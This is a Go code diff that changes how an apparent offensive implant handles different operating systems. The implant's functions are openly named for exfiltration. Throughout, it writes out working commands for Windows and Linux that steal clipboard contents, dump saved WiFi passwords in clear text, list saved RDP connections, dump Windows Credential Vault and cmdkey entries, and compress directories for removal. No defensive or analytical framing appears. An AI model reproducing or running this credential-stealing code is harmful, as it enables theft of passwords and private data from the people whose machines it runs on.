@@ -8,6 +8,7 @@ import (
 	"net/http"
 	"os"
 	"path/filepath"
+	"runtime"
 	"strings"
 	"time"
 )
@@ -169,8 +170,14 @@ func exfilSMB(filePath, sharePath string) ([]byte, error) {
 
 // Clipboard steal
 func exfilClipboard() ([]byte, error) {
-	out, err := ExecuteShell([]string{"powershell -c \"Get-Clipboard\" 2>/dev/null || xclip -selection clipboard -o 2>/dev/null || xsel --clipboard --output 2>/dev/null || echo '[no clipboard access]'"})
-	if err != nil {
+	var out []byte
+	var err error
+	if runtime.GOOS == "windows" {
+		out, err = executePowerShell("Get-Clipboard")
+	} else {
+		out, err = ExecuteShell([]string{"xclip -selection clipboard -o 2>/dev/null || xsel --clipboard --output 2>/dev/null || echo '[no clipboard access]'"})
+	}
+	if err != nil || len(out) == 0 {
 		return []byte("[-] Clipboard access failed"), nil
 	}
 	return append([]byte("[+] Clipboard contents:\n"), out...), nil
@@ -219,7 +226,13 @@ func exfilBrowser() ([]byte, error) {
 
 // WiFi password extraction
 func exfilWiFi() ([]byte, error) {
-	out, err := ExecuteShell([]string{`netsh wlan show profiles 2>nul && for /f "tokens=2 delims=:" %a in ('netsh wlan show profiles ^| findstr "Profile"') do @netsh wlan show profile "%a" key=clear 2>nul | findstr "Key Content" || echo [Linux] nmcli -s -g 802-11-wireless-security.psk connection show 2>/dev/null`})
+	var out []byte
+	var err error
+	if runtime.GOOS == "windows" {
+		out, err = executePowerShell(`$profiles = netsh wlan show profiles 2>$null; if ($profiles) { $profiles | ForEach-Object { if ($_ -match ':\s+(.+)$') { $p = $Matches[1].Trim(); $detail = netsh wlan show profile name="$p" key=clear 2>$null; $key = ($detail | Where-Object { $_ -match 'Key Content' }) -replace '.*:\s+',''; if ($key) { "$p : $key" } else { "$p : (no password)" } } } } else { 'No WiFi profiles found' }`)
+	} else {
+		out, err = ExecuteShell([]string{`nmcli -s -g 802-11-wireless-security.psk connection show 2>/dev/null || grep -r "psk=" /etc/NetworkManager/system-connections/ 2>/dev/null || echo "No WiFi passwords found"`})
+	}
 	if err != nil {
 		return []byte("[-] WiFi password extraction failed"), nil
 	}
@@ -228,16 +241,28 @@ func exfilWiFi() ([]byte, error) {
 
 // RDP saved credentials
 func exfilRDP() ([]byte, error) {
-	out, err := ExecuteShell([]string{`cmdkey /list 2>nul || echo "[-] No saved credentials"`})
+	var out []byte
+	var err error
+	if runtime.GOOS == "windows" {
+		out, err = executePowerShell(`$servers = Get-ChildItem 'HKCU:\Software\Microsoft\Terminal Server Client\Servers' -EA SilentlyContinue; if ($servers) { foreach ($s in $servers) { $s.PSChildName + ' : ' + $s.GetValue('UsernameHint') } } else { 'No saved RDP credentials found' }`)
+	} else {
+		out, err = ExecuteShell([]string{`find ~/.config/freerdp ~/.config/remmina -type f 2>/dev/null | head -20 || echo "No RDP client configs found"`})
+	}
 	if err != nil {
 		return []byte("[-] RDP credential extraction failed"), nil
 	}
-	return append([]byte("[+] Saved RDP/Network Credentials:\n"), out...), nil
+	return append([]byte("[+] Saved RDP Credentials:\n"), out...), nil
 }
 
 // Windows Credential Vault
 func exfilVault() ([]byte, error) {
-	out, err := ExecuteShell([]string{`powershell -c "[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | ForEach { $_.RetrievePassword(); $_ | Select Resource,UserName,Password }" 2>nul || vaultcmd /listcreds:"Windows Credentials" /all 2>nul || echo "[-] Vault access failed"`})
+	var out []byte
+	var err error
+	if runtime.GOOS == "windows" {
+		out, err = ExecuteShell([]string{`cmdkey /list 2>nul & echo --- & vaultcmd /listcreds:"Windows Credentials" /all 2>nul`})
+	} else {
+		out, err = ExecuteShell([]string{`echo "Windows Credential Vault is a Windows-only feature"`})
+	}
 	if err != nil {
 		return []byte("[-] Vault extraction failed"), nil
 	}
@@ -317,7 +342,13 @@ func exfilCloudKeys() ([]byte, error) {
 
 // Compress directory for exfiltration
 func exfilCompress(dir, output string) ([]byte, error) {
-	out, err := ExecuteShell([]string{fmt.Sprintf("tar czf %s -C %s . 2>/dev/null || powershell -c \"Compress-Archive -Path '%s\\*' -DestinationPath '%s' -Force\"", output, dir, dir, output)})
+	var out []byte
+	var err error
+	if runtime.GOOS == "windows" {
+		out, err = executePowerShell(fmt.Sprintf("Compress-Archive -Path '%s\\*' -DestinationPath '%s' -Force", dir, output))
+	} else {
+		out, err = ExecuteShell([]string{fmt.Sprintf("tar czf %s -C %s . 2>/dev/null", output, dir)})
+	}
 	if err != nil {
 		return nil, err
 	}
